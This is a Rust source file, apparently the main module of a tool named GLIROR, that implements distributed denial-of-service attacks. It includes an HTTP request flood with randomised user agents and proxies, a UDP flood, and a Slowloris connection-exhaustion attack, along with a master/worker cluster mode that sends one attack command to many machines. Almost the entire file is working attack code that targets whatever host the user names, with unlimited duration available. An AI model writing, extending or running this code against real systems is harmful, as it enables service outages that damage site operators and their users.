mod cli;
mod http;
mod display;
mod stats;
mod utils;
mod cluster;
mod udp;
mod slowloris;

use clap::Parser;
use cli::Args;
use colored::Colorize;
use display::print_cyan_ascii;
use http::perform_attack;
use udp::perform_udp_attack;
use cli::parse_headers;
use cluster::{ClusterCoordinator, ClusterConfig, WorkerState, WorkerStatus, WorkerProgress};
use gliror::config::Config;
use gliror::http::user_agents;
use std::fs;

#[tokio::main]
async fn main() {
    let mut args = Args::parse();

    if let Some(config_path) = &args.config {
        match fs::read_to_string(config_path) {
            Ok(config_str) => {
                match serde_yaml::from_str::<Config>(&config_str) {
                    Ok(config) => {
                        // Merge config into args, giving precedence to CLI args that are explicitly set.
                        args.url = args.url.or(config.url);
                        args.host = args.host.or(config.host);
                        args.target_port = args.target_port.or(config.target_port);
                        if args.attack_type == "http" { // Default value
                           if let Some(attack_type) = config.attack_type {
                                args.attack_type = attack_type;
                           }
                        }
                        if args.time == 30 { // Default value
                            if let Some(time) = config.time {
                                args.time = time;
                            }
                        }
                        if args.method == "GET" { // Default value
                            if let Some(method) = config.method {
                                args.method = method;
                            }
                        }
                        if args.header.is_empty() {
                            if let Some(headers_map) = config.headers {
                                args.header = headers_map.into_iter().map(|(k, v)| format!("{}: {}", k, v)).collect();
                            }
                        }
                        args.data = args.data.or(config.data);
                        args.proxy = args.proxy.or(config.proxy);
                        args.concurrent = args.concurrent.or(config.concurrent);
                        if args.delay == 0 { // Default value
                            if let Some(delay) = config.delay {
                                args.delay = delay;
                            }
                        }
                        args.ramp_up = args.ramp_up.or(config.ramp_up);
                        args.schedule = args.schedule.or(config.schedule);
                        if !args.cluster_mode { // Default value
                            if let Some(cluster_mode) = config.cluster_mode {
                                args.cluster_mode = cluster_mode;
                            }
                        }
                        args.worker_id = args.worker_id.or(config.worker_id);
                        args.coordinator_addr = args.coordinator_addr.or(config.coordinator_addr);
                        args.total_workers = args.total_workers.or(config.total_workers);
                        args.port = args.port.or(config.port);
                        args.role = args.role.or(config.role);
                        if args.distribution_mode == "even" { // Default value
                            if let Some(distribution_mode) = config.distribution_mode {
                                args.distribution_mode = distribution_mode;
                            }
                        }
                        if !args.random_ua { // If CLI did NOT set --random-ua
                            if let Some(config_random_ua) = config.random_ua {
                                args.random_ua = config_random_ua;
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("{} Failed to parse config file: {}", "ERROR".red(), e);
                    }
                }
            }
            Err(e) => {
                eprintln!("{} Failed to read config file: {}", "ERROR".red(), e);
            }
        }
    }
    
    if std::env::args().any(|arg| arg == "--version" || arg == "-V") {
        println!("GLIROR {}", env!("CARGO_PKG_VERSION"));
        return;
    }
    
    print_cyan_ascii();
    
    // Handle cluster mode
    if args.cluster_mode {
        println!("{} Cluster mode enabled", "INFO".blue());
        
        let args_clone = args.clone();
        let coordinator_addr = if let Some(addr) = args_clone.coordinator_addr {
            // If coordinator address is provided, use it as is
            addr
        } else {
            // Otherwise, build the address with the specified port (default 8080)
            let port = args_clone.port.unwrap_or(8080);
            format!("http://localhost:{}", port)
        };
        let total_workers = args_clone.total_workers.unwrap_or(2);
        let worker_id = args_clone.worker_id.unwrap_or_else(|| {
            use uuid::Uuid;
            Uuid::new_v4().to_string()
        });
        
        let _config = ClusterConfig::new(total_workers, coordinator_addr);
        
        if args.role.as_deref() == Some("master") {
            println!("{} Running in master mode", "INFO".blue());
            run_master_node(args).await;
        } else if args.role.as_deref() == Some("worker") {
            println!("{} Running in worker mode with ID: {}", "INFO".blue(), worker_id);
            run_worker_node(args).await;
        } else {
            // Default to standalone mode
            handle_standalone_attack(args).await;
        }
    } else {
        // Default to standalone mode
        handle_standalone_attack(args).await;
    }
}

async fn handle_standalone_attack(args: Args) {
    if args.attack_type == "udp" {
        // Handle UDP attack
        let target_host = if let Some(ref host) = args.host {
            host.clone()
        } else if let Some(ref url) = args.url {
            // Extract host from URL if provided
            url.replace("http://", "").replace("https://", "").split(':').next().unwrap_or(url).to_string()
        } else {
            utils::prompt_for_host()
        };
        
        let target_port = if let Some(port) = args.target_port {
            port
        } else if let Some(ref url) = args.url {
            // Extract port from URL if provided
            let cleaned_url = url.replace("http://", "").replace("https://", "");
            let parts: Vec<&str> = cleaned_url.split(':').collect();
            if parts.len() > 1 {
                parts[1].parse().unwrap_or(53) // Default to port 53 for DNS if parsing fails
            } else {
                utils::prompt_for_port()
            }
        } else {
            utils::prompt_for_port()
        };
        
        let duration = if args.time != 0 {
            args.time
        } else {
            utils::prompt_for_time()
        };
        
        println!("\n{} Starting UDP attack on: {}:{} with payload: {}", 
                 "INFO".blue(), target_host, target_port, 
                 args.data.as_ref().unwrap_or(&"GLIROR UDP FLOOD".to_string()));
        
        // Perform UDP attack
        match perform_udp_attack(target_host, target_port, duration, args.concurrent, args.delay, args.data) {
            Ok(()) => println!("{} UDP attack completed successfully", "INFO".blue()),
            Err(e) => eprintln!("{} UDP attack failed: {}", "ERROR".red(), e),
        }
    } else if args.attack_type == "slowloris" {
        // Handle Slowloris attack
        let target_host = if let Some(ref host) = args.host {
            host.clone()
        } else if let Some(ref url) = args.url {
            // Extract host from URL if provided
            url.replace("http://", "").replace("https://", "").split(':').next().unwrap_or(url).to_string()
        } else {
            utils::prompt_for_host()
        };
        
        let target_port = if let Some(port) = args.target_port {
            port
        } else if let Some(ref url) = args.url {
            // Extract port from URL if provided
            let cleaned_url = url.replace("http://", "").replace("https://", "");
            let parts: Vec<&str> = cleaned_url.split(':').collect();
            if parts.len() > 1 {
                parts[1].parse().unwrap_or(80) // Default to port 80 for HTTP
            } else {
                utils::prompt_for_port()
            }
        } else {
            utils::prompt_for_port()
        };
        
        let duration = if args.time != 0 {
            args.time
        } else {
            utils::prompt_for_time()
        };
        
        println!("\n{} Starting Slowloris attack on: {}:{}\n", 
                 "INFO".blue(), target_host, target_port);
        
        // Perform Slowloris attack
        match slowloris::perform_slowloris_attack(target_host, target_port, duration, args.concurrent, args.delay).await {
            Ok(()) => println!("{} Slowloris attack completed successfully", "INFO".blue()),
            Err(e) => eprintln!("{} Slowloris attack failed: {}", "ERROR".red(), e),
        }
    } else {
        // Handle HTTP attack (original functionality)
        let target_url = if let Some(url) = args.url {
            url
        } else {
            utils::prompt_for_url()
        };
        
        let duration = if args.time != 0 {
            args.time
        } else {
            utils::prompt_for_time()
        };
        
        let headers = parse_headers(&args.header);
        
        println!("\n{} Starting attack on: {}", "INFO".blue(), target_url);
        println!("{} Method: {}", "INFO".blue(), args.method);
        println!("{} Duration: {} seconds", "INFO".blue(), if duration == 0 { "Unlimited".to_string() } else { duration.to_string() });
        println!("{} Concurrent requests: {}", "INFO".blue(), 
                 args.concurrent.unwrap_or(if duration == 0 { 100 } else { 20 }));
        if let Some(ref proxy) = args.proxy {
            println!("{} Proxy: {}", "INFO".blue(), proxy);
        }
        
        perform_attack(target_url, duration, args.method, headers, args.data, args.proxy, args.concurrent, args.delay, args.output, args.ramp_up, args.schedule, args.random_ua).await;
    }
}

use cluster::server::run_master_server;
use std::sync::Arc;

async fn run_master_node(args: Args) {
    let args_clone = args.clone();
    let coordinator_addr = if let Some(addr) = args_clone.coordinator_addr {
        // If coordinator address is provided, use it as is
        addr
    } else {
        // Otherwise, build the address with the specified port (default 8080)
        let port = args_clone.port.unwrap_or(8080);
        format!("http://localhost:{}", port)
    };
    
    use cluster::ClusterDistributionMode;
    
    let distribution_mode = match args_clone.distribution_mode.as_str() {
        "max-power" => ClusterDistributionMode::MaxPower,
        _ => ClusterDistributionMode::Even, // Default to even distribution
    };
    
    let config = ClusterConfig::new_with_distribution_mode(
        args_clone.total_workers.unwrap_or(2),
        coordinator_addr,
        distribution_mode
    );

    let coordinator = Arc::new(ClusterCoordinator::new(config));

    // Determine port to use for master server
    let master_port = args.port.unwrap_or(8080);

    // Run server in a separate thread  
    let server_coordinator = coordinator.clone();
    tokio::spawn(async move {
        run_master_server(server_coordinator, master_port).await;
    });

    println!("{} Master server started. Listening on http://127.0.0.1:{}", "INFO".blue(), master_port);

    // Wait for all workers to connect
    let total_workers = coordinator.config.total_workers;
    println!("{} Waiting for {} workers to connect...", "INFO".blue(), total_workers);
    
    // Wait for all workers to connect
    loop {
        let connected_workers = coordinator.workers.read().await.len();
        if connected_workers >= total_workers {
            break;
        }
        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    }

    // Check if time was provided (different from default of 30)
    let time_provided = args.time != 30; // Default is 30, so if it's different, it was provided
    
    // Prompt for attack details after all workers connected (only if not provided in args)
    let target_url = if let Some(url) = args.url {
        url
    } else {
        utils::prompt_for_url()
    };
    let duration = if time_provided {
        args.time  // Use provided time
    } else {
        utils::prompt_for_time()  // Prompt for time if not provided
    };

    // Set default concurrent requests if not specified, higher for cluster mode
    let effective_concurrent = args.concurrent.unwrap_or_else(|| {
        if duration == 0 { 100 } else { 50 }  // Higher default for cluster to improve performance
    });

    let attack_command = cluster::AttackCommand {
        url: target_url,
        host: args.host.clone(),
        target_port: args.target_port,
        attack_type: args.attack_type.clone(),
        time: duration,
        method: args.method.clone(),
        header: args.header.clone(),
        data: args.data.clone(),
        proxy: args.proxy.clone(),
        concurrent: Some(effective_concurrent),
        delay: args.delay,
        output: args.output.clone(),
        ramp_up: args.ramp_up,
        schedule: args.schedule.clone(),
        random_ua: args.random_ua,
    };

    // Store the attack command for workers to pick up
    {
        let mut command_lock = coordinator.attack_command.write().await;
        *command_lock = Some(attack_command);
    }

    use indicatif::{ProgressBar, ProgressStyle};

    let pb = ProgressBar::new_spinner();
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner:.green} {msg}")
            .unwrap(),
    );

    let attack_start_time = std::time::Instant::now();

    loop {
        let progress = coordinator.get_total_progress().await;
        
        let elapsed_secs = attack_start_time.elapsed().as_secs_f64();
        let rps = if elapsed_secs > 0.0 { progress.requests_sent as f64 / elapsed_secs } else { 0.0 };

        pb.set_message(format!(
            "{} Sent: {}, Success: {}, Errors: {}, RPS: {:.1}, Avg: {:.2}ms",
            "STATUS:".green(),
            progress.requests_sent,
            progress.requests_success,
            progress.requests_error,
            rps,
            progress.avg_response_time
        ));

        let current_attack_command = coordinator.attack_command.read().await;
        if let Some(cmd) = current_attack_command.as_ref() {
            if cmd.time > 0 && attack_start_time.elapsed().as_secs() >= cmd.time {
                break;
            }
        } else {
            // This case should ideally not be reached if the command is set after workers connect.
            // However, as a safeguard, if for some reason the command is not present, we can break
            // or handle it based on desired behavior (e.g., continue indefinitely or log an error).
            // For now, we'll break to prevent an infinite loop if the command somehow disappears.
            break;
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    }

    // All workers should have completed by now, wait a bit more for final reports
    println!("{} All workers should have completed. Waiting 5 more seconds for final reports...", "INFO".blue());
    tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;

    pb.finish_and_clear();
    println!("{} All workers completed. Attack finished.", "INFO".blue());
    
    // Exit immediately after all workers complete
    std::process::exit(0);
}

use std::time::{Duration, Instant};
use std::sync::Mutex;
use std::sync::atomic::{AtomicU64, Ordering};

async fn run_worker_node(args: Args) {
    let args_clone = args.clone();
    let worker_id = args_clone.worker_id.unwrap_or_else(|| {
        use uuid::Uuid;
        Uuid::new_v4().to_string()
    });
    let coordinator_addr = if let Some(addr) = args_clone.coordinator_addr {
        // If coordinator address is provided, use it as is
        addr
    } else {
        // Otherwise, build the address with the specified port (default 8080)
        let port = args_clone.port.unwrap_or(8080);
        format!("http://localhost:{}", port)
    };

    let initial_state = WorkerState {
        id: worker_id.clone(),
        status: WorkerStatus::Initializing,
        progress: WorkerProgress {
            requests_sent: 0,
            requests_success: 0,
            requests_error: 0,
            avg_response_time: 0.0,
            current_rps: 0.0,
        },
        last_seen: None,
    };

    let client = reqwest::Client::new();
    loop {
        println!("{} Attempting to register worker {} with coordinator at {}", "INFO".blue(), worker_id, coordinator_addr);
        let res = client.post(format!("{}/workers", coordinator_addr))
            .json(&initial_state)
            .send()
            .await;

        match res {
            Ok(_) => {
                println!("{} Worker {} successfully registered. Polling for tasks...", "INFO".blue(), worker_id);
                break; // Sai do loop de registro uma vez que o registro é bem-sucedido
            }
            Err(e) => {
                eprintln!("{} Failed to connect to coordinator: {}. Retrying in 5 seconds...", "ERROR".red(), e);
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
    
    loop {
        let task_res = client.get(format!("{}/workers/{}/task", coordinator_addr, worker_id))
            .send()
            .await;

        match task_res {
            Ok(response) => {
                let response_text = response.text().await.unwrap_or_else(|_| "null".to_string());
                
                match serde_json::from_str::<Option<cluster::AttackCommand>>(&response_text) {
                    Ok(Some(task)) => {
                        println!("{} Task received by worker {}. Starting attack on: {} with {} concurrent requests.", "INFO".blue(), worker_id, task.url, task.concurrent.unwrap_or(10));
                        
                        // Update worker status to Working
                        let _ = client.post(format!("{}/workers/{}/status", coordinator_addr, worker_id))
                            .json(&WorkerStatus::Working)
                            .send()
                            .await;
                        
                        let requests_sent = Arc::new(AtomicU64::new(0));
                        let requests_success = Arc::new(AtomicU64::new(0));
                        let requests_error = Arc::new(AtomicU64::new(0));
                        let avg_response_time_values = Arc::new(Mutex::new(Vec::new()));
                        
                        // Status display for worker
                        use indicatif::{ProgressBar, ProgressStyle};
                        let worker_pb = ProgressBar::new_spinner();
                        worker_pb.set_style(
                            ProgressStyle::default_spinner()
                                .template(&format!("{{spinner:.green}} [{}] {{msg}}", worker_id))
                                .unwrap(),
                        );

                        // Reporter Task for worker stats
                        let reporter_client = client.clone();
                        let reporter_coordinator_addr = coordinator_addr.clone();
                        let reporter_worker_id = worker_id.clone();
                        let sent_clone = requests_sent.clone();
                        let success_clone = requests_success.clone();
                        let error_clone = requests_error.clone();
                        let response_times_clone = avg_response_time_values.clone();
                        let pb_clone = worker_pb.clone();
                        let mut last_sent = 0;
                        let mut last_report_time = Instant::now();
                        tokio::spawn(async move {
                            loop {
                                tokio::time::sleep(Duration::from_secs(1)).await;
                                let current_sent = sent_clone.load(Ordering::Relaxed);
                                let elapsed_since_last_report = last_report_time.elapsed().as_secs_f64();
                                let current_rps = if elapsed_since_last_report > 0.0 {
                                    (current_sent - last_sent) as f64 / elapsed_since_last_report
                                } else {
                                    0.0
                                };
                                last_sent = current_sent;
                                last_report_time = Instant::now();
                                
                                let avg_time = {
                                    let mut times = response_times_clone.lock().unwrap();
                                    let avg = if !times.is_empty() {
                                        times.iter().sum::<f64>() / times.len() as f64
                                    } else {
                                        0.0
                                    };
                                    times.clear(); // Clear for responsive average
                                    avg
                                };
                                
                                // Update progress bar on worker side (overwrites previous line)
                                pb_clone.set_message(format!(
                                    "{} Sent: {}, Success: {}, Errors: {}, RPS: {:.1}, Avg: {:.2}ms",
                                    "STATUS:".green(),
                                    current_sent,
                                    success_clone.load(Ordering::Relaxed),
                                    error_clone.load(Ordering::Relaxed),
                                    current_rps,
                                    avg_time
                                ));
                                
                                let progress = WorkerProgress {
                                    requests_sent: current_sent,
                                    requests_success: success_clone.load(Ordering::Relaxed),
                                    requests_error: error_clone.load(Ordering::Relaxed),
                                    avg_response_time: avg_time,
                                    current_rps,
                                };
                                // Check if the coordinator is still reachable before sending progress
                                if let Err(_) = reporter_client.post(format!("{}/workers/{}/progress", reporter_coordinator_addr, reporter_worker_id))
                                    .json(&progress)
                                    .send()
                                    .await {
                                    // If we can't reach the coordinator, continue trying 
                                    // We don't break here, just continue with the loop
                                }
                            }
                        });
                        
                        // Attacker Tasks
                        let mut tasks = Vec::new();
                        let attack_start_time = std::time::Instant::now();
                        
                        if task.attack_type == "udp" {
                            // UDP attack implementation for worker
                            let target_host = task.host.clone().unwrap_or_else(|| {
                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
                                cleaned_url.split(':').next().unwrap_or(&task.url).to_string()
                            });
                            let target_port = task.target_port.unwrap_or_else(|| {
                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
                                let parts: Vec<&str> = cleaned_url.split(':').collect();
                                if parts.len() > 1 {
                                    parts[1].parse().unwrap_or(53)
                                } else {
                                    53
                                }
                            });
                            let payload = task.data.clone();
                            
                            for _ in 0..task.concurrent.unwrap_or(10) {
                                let target_host_clone = target_host.clone();
                                let target_port_clone = target_port;
                                let payload_clone = payload.clone();
                                let sent_clone = requests_sent.clone();
                                let success_clone = requests_success.clone();
                                let error_clone = requests_error.clone();
                                let attack_start_time_clone = attack_start_time.clone();
                                let time_clone = task.time;
                                let delay_clone = task.delay;
                                
                                let task_handle = tokio::spawn(async move {
                                    loop {
                                        if time_clone > 0 && attack_start_time_clone.elapsed().as_secs() >= time_clone {
                                            break;
                                        }
                                        
                                        match udp_attack_single_request(&target_host_clone, target_port_clone, &payload_clone) {
                                            Ok(_) => {
                                                success_clone.fetch_add(1, Ordering::SeqCst);
                                            }
                                            Err(_) => {
                                                error_clone.fetch_add(1, Ordering::SeqCst);
                                            }
                                        }
                                        sent_clone.fetch_add(1, Ordering::SeqCst);
                                        
                                        if delay_clone > 0 {
                                            tokio::time::sleep(Duration::from_millis(delay_clone)).await;
                                        }
                                    }
                                });
                                tasks.push(task_handle);
                            }
                        } else if task.attack_type == "slowloris" {
                            // Slowloris attack implementation for worker
                            let target_host = task.host.clone().unwrap_or_else(|| {
                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
                                cleaned_url.split(':').next().unwrap_or(&task.url).to_string()
                            });
                            let target_port = task.target_port.unwrap_or_else(|| {
                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
                                let parts: Vec<&str> = cleaned_url.split(':').collect();
                                if parts.len() > 1 {
                                    parts[1].parse().unwrap_or(80) // Default to port 80 for HTTP
                                } else {
                                    80
                                }
                            });
                            
                            for _ in 0..task.concurrent.unwrap_or(10) {
                                let target_host_clone = target_host.clone();
                                let target_port_clone = target_port;
                                let sent_clone = requests_sent.clone();
                                let success_clone = requests_success.clone();
                                let error_clone = requests_error.clone();
                                let attack_start_time_clone = attack_start_time.clone();
                                let time_clone = task.time;
                                let delay_clone = task.delay;
                                
                                let task_handle = tokio::spawn(async move {
                                    loop {
                                        if time_clone > 0 && attack_start_time_clone.elapsed().as_secs() >= time_clone {
                                            break;
                                        }
                                        
                                        match perform_slowloris_worker_attack(&target_host_clone, target_port_clone).await {
                                            Ok(_) => {
                                                success_clone.fetch_add(1, Ordering::SeqCst);
                                            }
                                            Err(_) => {
                                                error_clone.fetch_add(1, Ordering::SeqCst);
                                            }
                                        }
                                        sent_clone.fetch_add(1, Ordering::SeqCst);
                                        
                                        if delay_clone > 0 {
                                            tokio::time::sleep(Duration::from_millis(delay_clone)).await;
                                        }
                                    }
                                });
                                tasks.push(task_handle);
                            }
                        } else {
                            // HTTP attack implementation for worker (original)
                            for _ in 0..task.concurrent.unwrap_or(10) {
                                let client_clone = client.clone();
                                let url_clone = task.url.clone();
                                let method_clone = task.method.clone();
                                let headers = parse_headers(&task.header);
                                let data_clone = task.data.clone();
                                let sent_clone = requests_sent.clone();
                                let success_clone = requests_success.clone();
                                let error_clone = requests_error.clone();
                                let response_times_clone = avg_response_time_values.clone();
                                
                                let task_handle = tokio::spawn(async move {
                                    loop {
                                        if task.time > 0 && attack_start_time.elapsed().as_secs() >= task.time {
                                            break;
                                        }
                                        let request_start = std::time::Instant::now();
                                        let mut request_builder = match method_clone.as_str() {
                                            "GET" => client_clone.get(&url_clone),
                                            "POST" => client_clone.post(&url_clone),
                                            "PUT" => client_clone.put(&url_clone),
                                            "DELETE" => client_clone.delete(&url_clone),
                                            "PATCH" => client_clone.patch(&url_clone),
                                            "HEAD" => client_clone.head(&url_clone),
                                            _ => client_clone.get(&url_clone),
                                        };

                                        // Add random User-Agent if enabled and not already set
                                        if task.random_ua && !headers.keys().any(|k| k.eq_ignore_ascii_case("user-agent")) {
                                            request_builder = request_builder.header("User-Agent", user_agents::get_random_user_agent());
                                        }

                                        for (key, value) in &headers {
                                            request_builder = request_builder.header(key, value);
                                        }
                                        if let Some(ref payload) = data_clone {
                                            request_builder = request_builder.body(payload.clone());
                                        }
                                        
                                        match request_builder.send().await {
                                            Ok(_) => {
                                                let elapsed = request_start.elapsed().as_millis() as f64;
                                                success_clone.fetch_add(1, Ordering::SeqCst);
                                                response_times_clone.lock().unwrap().push(elapsed);
                                            }
                                            Err(_) => {
                                                error_clone.fetch_add(1, Ordering::SeqCst);
                                            }
                                        }
                                        sent_clone.fetch_add(1, Ordering::SeqCst);
                                        
                                        if task.delay > 0 {
                                            tokio::time::sleep(Duration::from_millis(task.delay)).await;
                                        }
                                    }
                                });
                                tasks.push(task_handle);
                            }
                        }
                        
                        // Wait for all tasks to complete
                        for handle in tasks {
                            let _ = handle.await;
                        }
                        
                        // Get final statistics
                        let final_requests_sent = requests_sent.load(Ordering::Relaxed);
                        let final_requests_success = requests_success.load(Ordering::Relaxed);
                        let final_requests_error = requests_error.load(Ordering::Relaxed);

                        // Update worker status to Completed
                        let _ = client.post(format!("{}/workers/{}/status", coordinator_addr, worker_id))
                            .json(&WorkerStatus::Completed)
                            .send()
                            .await;

                        // Print final report
                        println!("\n{} Worker {} completed attack", "ATTACK COMPLETED".green().bold(), worker_id);
                        println!("Total requests sent: {}", final_requests_sent);
                        println!("Successful requests: {}", final_requests_success);
                        println!("Failed requests: {}", final_requests_error);
                        
                        let success_rate = if final_requests_sent > 0 {
                            (final_requests_success as f64 / final_requests_sent as f64) * 100.0
                        } else {
                            0.0
                        };
                        
                        if final_requests_sent > 0 {
                            println!("Success rate: {:.2}%", success_rate);
                        }

                        // Try to save detailed results to output file if specified in the task
                        if let Some(output_path) = &task.output {
                            use std::fs;
                            use serde_json::json;
                            
                            let results = json!({
                                "worker_id": worker_id,
                                "attack_details": {
                                    "url": &task.url,
                                    "attack_type": &task.attack_type,
                                    "time": task.time,
                                    "method": &task.method,
                                    "concurrent": task.concurrent,
                                    "delay": task.delay
                                },
                                "total_requests_sent": final_requests_sent,
                                "successful_requests": final_requests_success,
                                "failed_requests": final_requests_error,
                                "success_rate": success_rate,
                                "timestamp": chrono::Utc::now().to_rfc3339(),
                                "elapsed_time": attack_start_time.elapsed().as_secs_f64()
                            });
                            
                            match fs::write(output_path, serde_json::to_string_pretty(&results).unwrap()) {
                                Ok(_) => println!("{} Results saved to: {}", "INFO".blue(), output_path),
                                Err(e) => eprintln!("{} Failed to save results to {}: {}", "ERROR".red(), output_path, e),
                            }
                        }

                        println!("{} Worker {} completed attack and shutting down.", "INFO".blue(), worker_id);

                        // Small delay to ensure output is displayed and file is written
                        tokio::time::sleep(Duration::from_secs(2)).await;

                        // Exit the worker process after completing the attack
                        std::process::exit(0);
                    }
                    Ok(None) => {
                        // Worker is still waiting for a task, continue polling
                        tokio::time::sleep(Duration::from_secs(1)).await;
                    }
                    Err(e) => {
                        eprintln!("{} Failed to parse task response: {}", "ERROR".red(), e);
                        eprintln!("{} Raw response was: {}", "ERROR".red(), response_text);
                        // Wait a bit before trying again
                        tokio::time::sleep(Duration::from_secs(2)).await;
                    }
                }
            }
            Err(e) => {
                eprintln!("{} Lost connection to coordinator: {}. Attempting to re-register...", "ERROR".red(), e);
                
                // Wait a bit before trying to reconnect
                tokio::time::sleep(Duration::from_secs(3)).await;
                
                // Try to register with the coordinator again
                let initial_state = WorkerState {
                    id: worker_id.clone(),
                    status: WorkerStatus::Initializing,
                    progress: WorkerProgress {
                        requests_sent: 0,
                        requests_success: 0,
                        requests_error: 0,
                        avg_response_time: 0.0,
                        current_rps: 0.0,
                    },
                    last_seen: None,
                };

                loop {
                    match client.post(format!("{}/workers", coordinator_addr))
                        .json(&initial_state)
                        .send()
                        .await {
                        Ok(_) => {
                            println!("{} Worker {} successfully re-registered with coordinator.", "INFO".blue(), worker_id);
                            break; // Successfully re-registered, exit the reconnection loop
                        }
                        Err(e) => {
                            eprintln!("{} Reconnection attempt failed: {}. Retrying in 3 seconds...", "ERROR".red(), e);
                            tokio::time::sleep(Duration::from_secs(3)).await;
                            continue;
                        }
                    }
                }
                
                continue; // Continue the main loop to start polling tasks again
            }
        }
    }
}

fn udp_attack_single_request(target_host: &str, target_port: u16, payload: &Option<String>) -> Result<(), Box<dyn std::error::Error>> {
    use std::net::UdpSocket;
    
    let target_addr = format!("{}:{}", target_host, target_port);
    let default_payload = "GLIROR UDP FLOOD".to_string();
    let payload_bytes = payload.as_ref().unwrap_or(&default_payload).as_bytes();
    
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_write_timeout(Some(std::time::Duration::from_millis(100)))?;
    socket.send_to(payload_bytes, &target_addr)?;
    
    Ok(())
}

async fn perform_slowloris_worker_attack(target_host: &str, target_port: u16) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::net::TcpStream;
    use tokio::io::AsyncWriteExt;
    
    let target_addr = format!("{}:{}", target_host, target_port);
    let mut stream = TcpStream::connect(&target_addr).await?;
    
    // Send initial HTTP request headers slowly
    let initial_request = format!(
        "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n", 
        target_host
    );
    
    stream.write_all(initial_request.as_bytes()).await?;
    
    // Send a partial header to keep the connection alive
    stream.write_all(b"X-a: ").await?;
    stream.flush().await?;
    
    // Sleep to maintain the connection
    tokio::time::sleep(std::time::Duration::from_secs(10)).await;
    
    Ok(())
}